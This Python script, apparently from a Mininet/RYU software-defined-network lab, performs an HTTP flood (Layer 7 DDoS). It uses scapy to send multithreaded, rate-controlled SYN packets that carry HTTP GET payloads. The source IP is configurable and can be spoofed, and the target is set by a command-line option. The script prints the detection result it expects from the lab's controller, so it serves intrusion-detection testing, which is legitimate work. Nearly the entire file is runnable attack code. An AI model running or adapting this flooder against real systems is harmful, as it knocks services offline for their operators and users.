#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP Flood攻击脚本 (HTTP Flood / Layer 7 DDoS)

功能：模拟HTTP Flood攻击，大量HTTP请求淹没目标服务器

攻击者：H4 (192.168.1.103)
目标：H8 (192.168.1.200)

检测原理：
- 1秒内HTTP请求(TCP 80/443)数量 > 300
"""

from scapy.all import *
import threading
import time
import argparse
import random

def http_flood(target_ip='192.168.1.200', attacker_ip='192.168.1.103', threads=8, duration=60, rate=400):
    """
    HTTP Flood攻击
    
    Args:
        target_ip: 目标IP（受害者）
        attacker_ip: 攻击者IP（源）
        threads: 线程数
        duration: 攻击持续时间（秒）
        rate: 每秒HTTP请求数
    """
    
    stop_flag = threading.Event()
    stats = {'total_requests': 0, 'lock': threading.Lock()}
    
    # HTTP请求路径列表
    http_paths = [
        '/', '/index.html', '/admin', '/login', '/search',
        '/api/users', '/api/data', '/images/', '/css/style.css',
        '/js/main.js', '/about', '/contact', '/products'
    ]
    
    # User-Agent列表（模拟真实浏览器）
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1',
        'Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0'
    ]
    
    def http_flood_thread():
        """单个HTTP Flood线程"""
        while not stop_flag.is_set():
            try:
                # 随机选择端口（80或443）
                dst_port = random.choice([80, 443])
                src_port = random.randint(1024, 65535)
                path = random.choice(http_paths)
                ua = random.choice(user_agents)
                
                # 构造HTTP GET请求
                http_request = f"GET {path} HTTP/1.1\r\n" \
              f"Host: {target_ip}\r\n" \
              f"User-Agent: {ua}\r\n" \
              f"Accept: */*\r\n" \
              f"Connection: keep-alive\r\n\r\n"
                
                # 构造TCP SYN包 + HTTP payload
                ip = IP(src=attacker_ip, dst=target_ip)
                tcp_syn = TCP(sport=src_port, dport=dst_port, flags='S')
                pkt = ip / tcp_syn / Raw(load=http_request)
                
                # 发送数据包
                send(pkt, verbose=0)
                
                # 更新统计
                with stats['lock']:
                    stats['total_requests'] += 1
                
                # 控制速率
                time.sleep(1.0 / (rate / threads))
                
            except Exception as e:
                print(f"[错误] {e}")
    
    def monitor_thread():
        """监控线程，打印统计信息"""
        start_time = time.time()
        last_count = 0
        
        while not stop_flag.is_set():
            time.sleep(10)  # 每10秒打印一次
            
            elapsed = time.time() - start_time
            current_count = stats['total_requests']
            
            # 计算速率
            current_rate = (current_count - last_count) / 10
            avg_rate = current_count / elapsed if elapsed > 0 else 0
            
            print(f"[{int(elapsed)}s] 总HTTP请求: {current_count} | 当前速率: {current_rate:.1f} rps | 平均速率: {avg_rate:.1f} rps")
            
            last_count = current_count
    
    print(f"{'='*60}")
    print(f"🌊 HTTP Flood攻击启动")
    print(f"{'='*60}")
    print(f"攻击者IP: {attacker_ip} (H4)")
    print(f"目标IP:   {target_ip} (H8)")
    print(f"目标端口: 80/443 (HTTP/HTTPS)")
    print(f"线程数:   {threads}")
    print(f"目标速率: {rate} rps")
    print(f"持续时间: {duration} 秒")
    print(f"{'='*60}\n")
    
    # 启动攻击线程
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=http_flood_thread)
        t.daemon = True
        threads_list.append(t)
        t.start()
        print(f"[线程{i+1}] 已启动，目标速率: {rate//threads} rps")
    
    # 启动监控线程
    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()
    
    # 等待指定时间
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[中断] 用户停止攻击")
    
    # 停止所有线程
    stop_flag.set()
    for t in threads_list:
        t.join(timeout=1)
    
    print(f"\n{'='*60}")
    print(f"✅ HTTP Flood攻击结束")
    print(f"{'='*60}")
    print(f"总HTTP请求: {stats['total_requests']}")
    print(f"平均速率:   {stats['total_requests']/duration:.1f} rps")
    print(f"{'='*60}")
    print(f"\n💡 预期RYU控制器检测结果:")
    print(f"   - 异常类型: HTTP Flood")
    print(f"   - 限速措施: 512 kbps")
    print(f"   - 检测条件: 1秒内HTTP请求>300")
    print(f"   - ✅ 会写入attack_sessions表")
    print(f"   - ✅ 大约1-2秒内触发！")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='HTTP Flood攻击脚本')
    parser.add_argument('--target', '-t', default='192.168.1.200', help='目标IP地址（默认H8）')
    parser.add_argument('--attacker', '-a', default='192.168.1.103', help='攻击者IP（默认H4）')
    parser.add_argument('--threads', '-n', type=int, default=8, help='线程数')
    parser.add_argument('--duration', '-d', type=int, default=60, help='攻击持续时间（秒）')
    parser.add_argument('--rate', '-r', type=int, default=400, help='目标速率（rps）')
    
    args = parser.parse_args()
    
    try:
        http_flood(
            target_ip=args.target,
            attacker_ip=args.attacker,
            threads=args.threads,
            duration=args.duration,
            rate=args.rate
        )
    except KeyboardInterrupt:
        print("\n\n[中断] 用户停止攻击")
    except Exception as e:
        print(f"\n[错误] {e}")

"""
使用示例：

1. 默认攻击（H4 攻击 H8，400 rps，60秒）：
   sudo python3 http_flood.py

2. 高速攻击（600 rps）：
   sudo python3 http_flood.py -r 600 -n 10

在Mininet中使用：
   mininet> h4 python3 http_flood.py &

注意：
- ✅ 默认配置：H4(192.168.1.103) 攻击 H8(192.168.1.200)
- ✅ RYU检测阈值：1秒内>300个HTTP请求
- ✅ 默认400rps，几秒钟就会触发检测
- ✅ 会自动写入attack_sessions表
"""